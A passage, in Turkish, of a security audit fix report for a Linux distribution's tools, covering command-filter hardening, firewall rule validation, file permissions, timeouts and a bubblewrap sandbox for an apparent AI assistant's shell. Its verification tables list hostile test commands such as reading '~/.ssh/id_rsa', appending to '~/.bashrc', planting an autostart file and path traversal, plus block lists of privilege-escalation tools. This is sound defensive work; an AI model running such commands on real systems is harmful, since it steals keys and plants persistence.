| Alt komut `any()` ile aranıyordu | İlk bayrak-olmayan token'a bağlandı; alt komuttan **önce** gelen bayrak reddediliyor (`git -c`, `git --exec-path`). `pacman` ayrı ele alındı (işlemi bayrakla yazılıyor): listelenmemiş bayrak yanına takılamıyor |
| `-o` gibi yazma bayrakları | `_UNSAFE_FLAGS` — komut başına, çünkü `-o` `sort` için dosya, `grep` için "only-matching" |
| **`<(...)` / `>(...)`** — denetimde kaçmıştı | `$(`/backtick ile aynı listede: `_SHELL_EXEC_MARKERS` |

**Doğrulama:** 22 saldırı dizesi (hepsi eskiden onaysız çalışıyordu) reddediliyor,
23 normal komut geçmeye devam ediyor. `tests/test_safety.py` 40 → **84 test**;
yeni ikisi kategori bazlı parametrize, tek dize değil.

## Bulgu 18 — Firewall kural doğrulaması  🟠

**Değişen:** `maze-guard/maze/helper.py`

Adres artık regexle *yargılanmıyor*, regexle **yakalanıp** `ipaddress` ile
ayrıştırılıyor (`_fwc_address_ok` / `_fwc_rule_ok`). Bir CIDR'nin ne kadar
geniş olduğu metinsel bir özellik değil — eski kontrolün kaçırdığı da tam
buydu. Taban: IPv4 `/8`, IPv6 `/32`.

Eşik neden `/8`: uygulama zaten yalnızca tek host engelliyor, ama Firewall
sekmesi elle CIDR yazmaya izin veriyor ve `10.0.0.0/8` meşru. `/8`'de IPv4'ü
kapatmak 256 kural ister ve ilki kullanıcının kendi bağlantısını görünür
şekilde koparır; `/0` ve `/1` bunu bir-iki kuralda, sessizce yapıyordu.

**Yan fayda:** `999.1.1.1` gibi adresler de artık reddediliyor (eski `\d{1,3}`
kabul ediyordu).

**Doğrulama:** 11 tehlikeli kural reddediliyor, 10 meşru kural geçiyor.
`tests/test_core.py`'daki `_allowed` yardımcısı da düzeltildi — regexleri
doğrudan çağırdığı için yeni kontrolü **atlıyordu** ve testler yanlış yerde
yeşil kalırdı.

## Bulgu 19 — Qlam'ın root ikilisi  🟠

**Değişen:** `Qlam/core/database_manager.py`

`shutil.which("freshclam")` yerine `_resolve_freshclam()`: sabit sistem yolları
(`/usr/bin`, `/usr/local/bin`), ve dosyanın gerçek dosya, root sahipli,
grup/diğer yazılabilir **olmayan** ve çalıştırılabilir olduğu doğrulanıyor.

**Doğrulama:** PATH'in başına sahte bir `freshclam` konuldu —
`shutil.which` onu seçiyor, `_resolve_freshclam` `/usr/bin/freshclam`'de kalıyor.

## Bulgu 20 — API anahtarı izinleri  🟠

**Değişen:** `Maze-AI/maze_ai/config.py`

`haze/storage/settings.py`'deki kalıp uygulandı: geçici dosya
`os.open(..., 0o600)` ile **baştan** dar açılıyor, `CONFIG_DIR` 0700 yapılıyor,
ve `chmod`'un sessizce yutulan `except OSError: pass`'i kaldırıldı.

**Doğrulama:** yeni `tests/test_config_permissions.py` (3 test) — ilk kayıt,
**ikinci kayıt** (asıl kayan yol: `rename` geçici dosyanın modunu taşıyor), ve
dünya-okunur bir dosyadan yükseltme.

## Bulgu 21 — `_run` zaman aşımı  🟡

**Değişen:** `maze-guard/maze/helper.py`

`subprocess.run`'a `timeout=timeout` verildi; `asyncio.wait_for` `timeout + 5`
ile arkada bekçi olarak kaldı. Çocuğu öldüren kısım işçi iş parçacığını da
serbest bırakan kısım.

**Doğrulama:** 8 sn'lik bir komut 1 sn'de kesiliyor ve **öksüz süreç kalmıyor**
(eskiden kalıyordu). Arka arkaya 40 zaman aşımından sonra normal bir komut hâlâ
çalışıyor — havuz tükenmiyor. `test_slow_command_cannot_freeze_the_helper`
yeniden yazıldı: sahte `subprocess.run` artık `timeout`'a **uyuyor** ve
`_run`'un onu geçirdiğini ayrıca doğruluyor (eski sahte yok sayıyordu, yani
test zafiyet varken de geçerdi).

## Bulgu 22 — Linux-Chan-AI sandbox'ı  🟡

**Değişen:** `Linux-Chan-AI/linux-chan.py`, `README.md`, `packaging/PKGBUILD`

İddia düzeltilmedi — **iddia gerçek yapıldı.** `cwd=SANDBOX_DIR` yerine `bwrap`
(yoksa `firejail`, o da yoksa **çalıştırmayı reddet**):

```
--ro-bind / /      sistem okunur ama yazılamaz
--tmpfs $HOME      ev dizini yok olur: .ssh, .bashrc, autostart erişilemez
--bind SANDBOX     tek yazılabilir yol
```

Sistem okumaları bilerek serbest: asistanın işi makine hakkında soru
cevaplamak, ve `cat /etc/os-release` bir şey sızdırmıyor. `pkexec`, `doas`,
`run0` de engel listesine eklendi. `_sandbox_path` önek yerine **ayraç
sınırında** karşılaştırıyor. `bubblewrap` sert bağımlılık yapıldı.

**Doğrulama (gerçekten çalıştırıldı):**

| Eskiden çalışıyordu | Şimdi |
|---|---|
| `cat ~/.ssh/id_rsa` | `No such file or directory` |
| `echo pwned >> ~/.bashrc` | tmpfs'e yazıyor, **gerçek `~/.bashrc` değişmiyor** |
| `~/.config/autostart/e.desktop` bırakmak | tmpfs'e gidiyor, diskte iz yok |
| `ls ~/Documents` | `No such file or directory` |
| `echo x > /etc/evil` | `Read-only file system` |
| `../Linux-Chan-AI-evil/x.txt` | `None` |
| — | `echo hi > note.txt` sandbox'ta **kalıcı** ✓ |
| — | `cat /etc/os-release` hâlâ çalışıyor ✓ |

## Bulgu 23 — entropy-shield ayrıcalık düşürme  🟡

**Değişen:** `entropy-shield/core/onion_server.py`

`extra_groups` eklendi. `user=`/`group=` yalnızca `setreuid`/`setregid` çağırır;
`setgroups` için bu argüman gerekir, yoksa çocuk **ebeveynin** ek gruplarını
devralır. Çözülemezse boş liste — root'un gruplarını miras almaktansa hiç grup.

## Düşük öncelikliler — hepsi kapatıldı

| Madde | Düzeltme | Doğrulama |
|---|---|---|
| HazeDrop `/info` metadata | Parola korumalıyken `filename` ve `file_hash` **verilmiyor**; gerçek ad indirmeyle gelen `X-HazeDrop-Filename` başlığından alınıyor, sayfa o ana kadar "Protected file" gösteriyor | JS zaten başlığı tercih ediyordu; şablon yer tutucu ve indirme sonrası güncelleme ile düzeltildi |
| haze kurulum `/tmp` | Sabit ad yerine `mktemp` + `trap ... EXIT` | `bash -n` |
| maze-guard sınırsız görev | `_MAX_PENDING = 64`; dolunca okumayı durduruyor, geri basıncı sokete bırakıyor | 500 boru hatlı istek → **500 yanıt**, sıra bozulmadan |
| maze-guard 64 KB satır | `async for` yerine `readline()` + `ValueError` yakalama; bağlantı denetim kaydıyla temiz kapanıyor | 200 KB'lık satır → temiz kapanış (eskiden yakalanmayan istisna) |
| Qlam karantina | Depo dizini `0700`; `index.json`'dan gelen **her yol depoya karşı doğrulanıyor** (ayraç sınırında); indeks yaz-ve-yeniden-adlandır + `fsync` ile atomik | Kurcalanmış indeksle `restore`/`delete` reddediliyor, kurban dosya sağlam; normal karantina→geri yükleme çalışıyor |

## Yayınlanacak paketler

`pkgrel` artırıldı — `ARCHITECTURE.md` §5: artırılmazsa uzak `[mazelinux]`
deposundaki sürüm kazanır ve düzeltmeler ISO'ya **girmez.**

| Paket | Sürüm | İçerdiği |
|---|---|---|
| `maze-ai` | 1.12.0-**2** | 17, 20 |
| `maze-guard` | 2.16.0-**2** | 18, 21, sınırsız görev, 64 KB satır |
| `qlam` | 1.1.0-**2** | 19, karantina sertleştirmesi |
| `linux-chan-ai` | 1.1.4-**2** | 22 (+ `bubblewrap` bağımlılığı) |
| `entropy-shield` | 4.1.3-**2** | 23 |
| `hazedrop` | 1.4.0-**2** | `/info` metadata |
| `maze-connect` | **1.1.0**-1 | 16 — *pkgrel değil pkgver: tel protokolü kırıldı* |
| Maze Connect (Android) | **0.13.0** (versionCode 44) | 16 — masaüstüyle **birlikte** yayınlanmalı |

`haze` paketi değişmedi: düzeltilen `installer/install.sh` elle kurulum içindir,
PKGBUILD onu paketlemiyor.

## Yayından önce yapılacaklar

1. **`./gradlew :core:testDebugUnitTest`** — Kotlin tarafı burada derlenemedi
   (JDK 8 var, Gradle 17+ istiyor). Bulgu 16'nın mobil yarısı test edilmedi.
2. **Masaüstü ve mobil aynı anda yayınlanmalı.** v3 ↔ v4 bilerek uyumsuz:
   güncellenmemiş bir telefon eşleşmeyi reddedecek, sessizce zayıf moda
   düşmeyecek. Bu doğru davranış, ama kullanıcıya duyurulması gereken bir şey.
3. Bu tur `maze-guard`'ın **tespit motorunu** (`maze/detection/*`) hâlâ
   kapsamıyor — kök yetkiyle düşmanca paket ayrıştırılan tek yer. Sıradaki
   denetimin hedefi orası.
